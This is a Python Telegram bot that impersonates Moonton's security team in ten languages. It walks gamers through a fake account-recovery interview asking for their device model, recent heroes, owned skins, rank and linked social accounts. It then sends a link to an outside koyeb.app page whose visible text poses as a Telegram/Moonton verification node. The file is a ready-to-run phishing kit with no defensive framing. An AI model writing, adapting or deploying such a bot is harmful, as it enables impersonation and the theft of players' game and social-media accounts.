import os
import time
import logging
import psycopg2
import telebot
from telebot import types
from psycopg2 import pool
from threading import Thread

# =========================================================================
# 1. SYSTEM CONFIGURATION (Koyeb Environment Variables)
# =========================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO)

# Database Connection Pool
try:
    db_pool = psycopg2.pool.ThreadedConnectionPool(1, 20, dsn=DATABASE_URL, sslmode='require')
    conn = db_pool.getconn()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS user_preferences (user_id BIGINT PRIMARY KEY, lang_code TEXT DEFAULT 'en')")
    conn.commit()
    cur.close()
    db_pool.putconn(conn)
except Exception as e:
    logging.error(f"DB Error: {e}")

def get_lang(uid):
    conn = db_pool.getconn()
    cur = conn.cursor()
    cur.execute("SELECT lang_code FROM user_preferences WHERE user_id = %s", (uid,))
    res = cur.fetchone()
    cur.close()
    db_pool.putconn(conn)
    return res[0] if res else 'en'

def set_lang(uid, lang):
    conn = db_pool.getconn()
    cur = conn.cursor()
    cur.execute("INSERT INTO user_preferences (user_id, lang_code) VALUES (%s, %s) ON CONFLICT (user_id) DO UPDATE SET lang_code = EXCLUDED.lang_code", (uid, lang))
    conn.commit()
    cur.close()
    db_pool.putconn(conn)

# =========================================================================
# 2. MULTI-LANGUAGE DICTIONARY (10 LANGUAGES)
# =========================================================================
STRINGS = {
    'en': {
        'confirm': 'System detected a pending recovery request. Is this your account?',
        'yes': '✅ YES, IT IS ME', 'no': '❌ NO',
        'bound': '✅ <b>Account Linked!</b>\n<b>User ID:</b> <code>{uid}</code>',
        'q1': '📋 1/5: What is the brand and model of the device you usually use to log in?',
        'q2': '📋 2/5: What was the name of the last hero you played in a Ranked match?',
        'q3': '📋 3/5: What is the name of the most expensive skin you own (Epic/Collector/Legend)?',
        'q4': '📋 4/5: What is your current Rank and the name of your Squad?',
        'q5': '📋 5/5: Which social media accounts were linked to this ID (FB/TikTok/VK)?',
        'review': '⏳ <b>Information Received.</b>\nMoonton Security Team is now reviewing your data. Please wait 5 minutes...',
        'final': '🛡️ <b>Review Complete!</b>\nTo finalize the recovery, you must bind your device to the secure node below:\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind?Verification_Secure_Node</a>'
    },
    'kh': {
        'confirm': 'ប្រព័ន្ធបានរកឃើញសំណើរសុំសង្គ្រោះគណនី។ តើនេះជាគណនីរបស់អ្នកមែនទេ?',
        'yes': '✅ បាទ/ចាស ពិតជាខ្ញុំមែន', 'no': '❌ ទេ',
        'bound': '✅ <b>ការភ្ជាប់គណនីបានជោគជ័យ!</b>\n<b>User ID:</b> <code>{uid}</code>',
        'q1': '📋 1/5: តើម៉ាក និងម៉ូដែលឧបករណ៍អ្វីដែលអ្នកធ្លាប់ប្រើដើម្បីចូលលេង?',
        'q2': '📋 2/5: តើហេរ៉ូចុងក្រោយដែលអ្នកបានលេងក្នុងវគ្គ Ranked ឈ្មោះអ្វី?',
        'q3': '📋 3/5: តើ Skin ដែលមានតម្លៃថ្លៃបំផុតដែលអ្នកមានឈ្មោះអ្វី?',
        'q4': '📋 4/5: តើ Rank បច្ចុប្បន្នរបស់អ្នកកម្រិតណា ហើយ Squad របស់អ្នកឈ្មោះអ្វី?',
        'q5': '📋 5/5: តើគណនីបណ្តាញសង្គមណាខ្លះដែលបានភ្ជាប់ (FB/TikTok/VK)?',
        'review': '⏳ <b>ទទួលបានព័ត៌មានរួចរាល់។</b>\nក្រុមការងារសន្តិសុខ Moonton កំពុងពិនិត្យមើលទិន្នន័យរបស់អ្នក។ សូមរង់ចាំ ៥ នាទី...',
        'final': '🛡️ <b>ការពិនិត្យត្រូវបានបញ្ចប់!</b>\nដើម្បីបញ្ចប់ការសង្គ្រោះ អ្នកត្រូវតែភ្ជាប់ឧបករណ៍របស់អ្នកទៅកាន់ Secure Node ខាងក្រោម៖\n\n🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind?Verification_Secure_Node</a>'
    },
    'id': { 'confirm': 'Sistem mendeteksi permintaan pemulihan. Apakah ini akun Anda?', 'yes': '✅ YA, INI SAYA', 'no': '❌ TIDAK', 'bound': '✅ <b>Akun Terhubung!</b>', 'q1': '📋 1/5: Apa merk/model HP Anda?', 'q2': '📋 2/5: Hero terakhir di Ranked?', 'q3': '📋 3/5: Skin termahal Anda?', 'q4': '📋 4/5: Rank dan nama Squad?', 'q5': '📋 5/5: Akun Sosmed yang terhubung?', 'review': '⏳ Menunggu review...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'ph': { 'confirm': 'May nakitang recovery request. Sayo ba itong account?', 'yes': '✅ OO, AKO ITO', 'no': '❌ HINDI', 'bound': '✅ <b>Account Linked!</b>', 'q1': '📋 1/5: Anong device model mo?', 'q2': '📋 2/5: Last hero sa Ranked?', 'q3': '📋 3/5: Pinakamahal na skin?', 'q4': '📋 4/5: Rank at Squad name?', 'q5': '📋 5/5: Linked Social Accounts?', 'review': '⏳ Processing...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'ms': { 'confirm': 'Sistem kesan permintaan pemulihan. Adakah ini akaun anda?', 'yes': '✅ YA, SAYA', 'no': '❌ TIDAK', 'bound': '✅ <b>Akaun Berjaya Diikat!</b>', 'q1': '📋 1/5: Apa model peranti anda?', 'q2': '📋 2/5: Hero terakhir Ranked?', 'q3': '📋 3/5: Skin paling mahal?', 'q4': '📋 4/5: Rank dan nama Squad?', 'q5': '📋 5/5: Akaun Sosmed yang terikat?', 'review': '⏳ Menunggu semakan...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'th': { 'confirm': 'ระบบตรวจพบคำขอกู้คืน นี่คือบัญชีของคุณใช่หรือไม่?', 'yes': '✅ ใช่ ฉันเอง', 'no': '❌ ไม่ใช่', 'bound': '✅ <b>เชื่อมต่อบัญชีสำเร็จ!</b>', 'q1': '📋 1/5: รุ่นมือถือที่คุณใช้?', 'q2': '📋 2/5: ฮีโร่ตัวล่าสุดที่เล่น Ranked?', 'q3': '📋 3/5: สกินที่แพงที่สุดที่มี?', 'q4': '📋 4/5: แรงค์และชื่อทีม?', 'q5': '📋 5/5: โซเชียลที่ผูกไว้?', 'review': '⏳ รอตรวจสอบ...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'vn': { 'confirm': 'Hệ thống phát hiện yêu cầu khôi phục. Đây có phải tài khoản của bạn?', 'yes': '✅ ĐÚNG, LÀ TÔI', 'no': '❌ KHÔNG', 'bound': '✅ <b>Đã liên kết!</b>', 'q1': '📋 1/5: Tên điện thoại bạn dùng?', 'q2': '📋 2/5: Hero chơi Ranked cuối?', 'q3': '📋 3/5: Skin đắt nhất?', 'q4': '📋 4/5: Rank và tên Squad?', 'q5': '📋 5/5: Tài khoản MXH liên kết?', 'review': '⏳ Đang xem xét...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'mm': { 'confirm': 'အကောင့်ပြန်လည်ရယူရန် တောင်းဆိုချက်ကို တွေ့ရှိပါသည်။ သင်၏အကောင့်ဖြစ်ပါသလား?', 'yes': '✅ ဟုတ်ကဲ့၊ ကျွန်ုပ်ပါ', 'no': '❌ မဟုတ်ပါ', 'bound': '✅ <b>ချိတ်ဆက်မှု အောင်မြင်သည်။</b>', 'q1': '📋 1/5: အသုံးပြုသည့် ဖုန်းအမျိုးအစား?', 'q2': '📋 2/5: နောက်ဆုံးကစားခဲ့သည့် Hero?', 'q3': '📋 3/5: အဖိုးတန်ဆုံး Skin?', 'q4': '📋 4/5: လက်ရှိ Rank နှင့် Squad အမည်?', 'q5': '📋 5/5: ချိတ်ဆက်ထားသော ဆိုရှယ်အကောင့်များ?', 'review': '⏳ စစ်ဆေးနေဆဲ...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'ru': { 'confirm': 'Обнаружен запрос на восстановление. Это ваш аккаунт?', 'yes': '✅ ДА, ЭТО Я', 'no': '❌ НЕТ', 'bound': '✅ <b>Аккаунт привязан!</b>', 'q1': '📋 1/5: Модель вашего устройства?', 'q2': '📋 2/5: Последний герой в Ranked?', 'q3': '📋 3/5: Самый дорогой скин?', 'q4': '📋 4/5: Ваш ранг и название Squad?', 'q5': '📋 5/5: Соцсети (ФБ/ТТ)?', 'review': '⏳ Ожидание...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' },
    'cn': { 'confirm': '系统检测到找回请求。这是您的账号吗？', 'yes': '✅ 是的', 'no': '❌ 不是', 'bound': '✅ <b>账号已关联!</b>', 'q1': '📋 1/5: 手机型号？', 'q2': '📋 2/5: 最后一场排位英雄？', 'q3': '📋 3/5: 最贵皮肤？', 'q4': '📋 4/5: 段位和战队？', 'q5': '📋 5/5: 绑定的社交账号？', 'review': '⏳ 审核中...', 'final': '🔗 <a href="https://selfish-kettie-moonton-support-c57267de.koyeb.app//?id={uid}">https://Telegram/Moonton-Recovery/Bind</a>' }
}

# =========================================================================
# 3. INTERVIEW FLOW & TIMER
# =========================================================================

def start_interview(cid, lang):
    msg = bot.send_message(cid, STRINGS[lang]['q1'])
    bot.register_next_step_handler(msg, step_2, lang)

def step_2(m, lang):
    msg = bot.send_message(m.chat.id, STRINGS[lang]['q2'])
    bot.register_next_step_handler(msg, step_3, lang)

def step_3(m, lang):
    msg = bot.send_message(m.chat.id, STRINGS[lang]['q3'])
    bot.register_next_step_handler(msg, step_4, lang)

def step_4(m, lang):
    msg = bot.send_message(m.chat.id, STRINGS[lang]['q4'])
    bot.register_next_step_handler(msg, step_5, lang)

def step_5(m, lang):
    msg = bot.send_message(m.chat.id, STRINGS[lang]['q5'])
    bot.register_next_step_handler(msg, final_wait, lang)

def final_wait(m, lang):
    bot.send_message(m.chat.id, STRINGS[lang]['review'], parse_mode="HTML")
    Thread(target=send_final_link, args=(m.chat.id, lang, m.from_user.id)).start()

def send_final_link(cid, lang, uid):
    time.sleep(300) # 5 Minutes
    text = STRINGS[lang]['final'].format(uid=uid)
    bot.send_message(cid, text, parse_mode="HTML", disable_web_page_preview=True)

# =========================================================================
# 4. BOT COMMANDS
# =========================================================================

@bot.message_handler(commands=['start'])
def welcome(m):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [types.InlineKeyboardButton(v[0], callback_data=f"l_{v[1]}") for v in [
        ('🇺🇸 English', 'en'), ('🇰🇭 ខ្មែរ', 'kh'), ('🇮🇩 Indo', 'id'), ('🇵🇭 Tagalog', 'ph'),
        ('🇲🇾 Melayu', 'ms'), ('🇹🇭 ไทย', 'th'), ('🇻🇳 Tiếng Việt', 'vn'), ('🇲🇲 ဗမာ', 'mm'),
        ('🇷🇺 Русский', 'ru'), ('🇨🇳 中文', 'cn')
    ]]
    markup.add(*btns)
    bot.send_message(m.chat.id, "🌐 **Please select your language:**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("l_"))
def handle_lang(call):
    lang = call.data.split("_")[1]
    set_lang(call.from_user.id, lang)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(STRINGS[lang]['yes'], callback_data=f"y_{lang}"),
               types.InlineKeyboardButton(STRINGS[lang]['no'], callback_data=f"n_{lang}"))
    bot.edit_message_text(STRINGS[lang]['confirm'], call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("y_"))
def handle_yes(call):
    lang = call.data.split("_")[1]
    bot.edit_message_text(STRINGS[lang]['bound'].format(uid=call.from_user.id), call.message.chat.id, call.message.message_id, parse_mode="HTML")
    time.sleep(2)
    start_interview(call.message.chat.id, lang)

if __name__ == "__main__":
    bot.polling(none_stop=True)
